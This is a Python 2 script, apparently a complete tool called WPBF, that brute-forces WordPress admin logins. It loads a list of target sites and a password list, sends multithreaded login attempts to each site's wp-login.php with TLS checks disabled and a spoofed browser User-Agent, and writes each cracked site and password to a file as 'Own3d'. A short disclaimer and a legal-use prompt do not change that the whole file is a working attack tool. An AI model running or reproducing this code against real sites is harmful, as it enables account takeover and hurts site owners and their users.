#!/usr/bin/env python 

__author__ = 'Dejan Levaja'
__license__ = 'GPL'
__version__ = '1.0.0'

import sys
import requests
import time
import threading
import Queue

lock = threading.Semaphore()
q = Queue.Queue()

# SETTINGS
user = 'admin'
num_threads = 50
timeout = 3
verbose = True
debug    = False


discalaimer = """
-----------------------------------------------------------------
!!! DISCLAIMER !!!
Hacking is illegal!
I am not responsible for misuse or any damage that you may cause! 
-----------------------------------------------------------------
"""


def writer(msg):
    with open(output, 'a') as f:
        f.write(msg+'\n')

def error():
    print '\nSyntax error. '
    print 'wpbf.py sites pwds output'
    sys.exit()


def own3r(pwds):
    fqdn = q.get()
    if fqdn.endswith('/'):
        fqdn = fqdn.rstrip('/')
    url = fqdn+'/wp-login.php'
    if verbose == True:
        lock.acquire()
        print '[=] URL: %s' % fqdn
        lock.release()
    
    for password in pwds:
        headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'
                        }

        payload = {
                        'log':user,
                        'pwd':password,
                        'wp-submit':'Log In',
                        'testcookie':'1'
                        }
        try:
            r = requests.post(url, data=payload, headers=headers, timeout=timeout, verify=False)
            cookie = str(r.cookies)
            if cookie.find('settings')>-1 or cookie.find('=' + user)>-1:
                print '[*] Own3d ==> Site: %s\tPassword: %s'% (fqdn, password)
                msg = fqdn+'::'+password
                lock.acquire()
                writer(msg)
                lock.release()
        except Exception,  e:
            if debug==True:
                lock.acquire()
                print '[!] Exception: %s' % e
                lock.release()

    
def main():
    print '\n\n*** WPBF - a multithreaded WP Brute Forcer ***\n'
    print discalaimer
    agree = raw_input('\nYou agree that you will use WPBF for legal purposes only [y|n] ?  ')
    if not agree.lower() == 'y':
        sys.exit()
    print '\n[!] Loading sites...'
    with open(sites_file) as st:
        raw = [q.put(x.strip()) for x in  st.readlines()]
    print '\t[+] Successfully loaded %d sites from "%s"' % (q.qsize(), sites_file)
    print '[!] Loading pwds...'
    with open(pwds_file) as pw:
        pwds = [x.strip() for x in pw.readlines()]
    print '\t[+] Successfully loaded %d pwds from "%s"' % (len(pwds), pwds_file)
    print '\n[!] Executing attack in %d threads. \n' % num_threads

    while not q.empty():
            tcount = threading.active_count()
            if tcount < num_threads:
                p = threading.Thread(target=own3r,args=(pwds, ))
                #p.daemon = True
                p.start()  
            else:
                time.sleep(0.5)
        
    tcount = threading.active_count()
    while tcount > 1:
        print  'Waiting for threads to finish. Current thread count: %d' % tcount
        time.sleep(1)
        tcount = threading.active_count()
                
          
        


if __name__ == '__main__':
    if len(sys.argv) != 4:
        error()
    sites_file  = sys.argv[1]
    pwds_file = sys.argv[2]
    output     = sys.argv[3]
    main()
    print '\n\n[!] Done!'
    sys.exit()
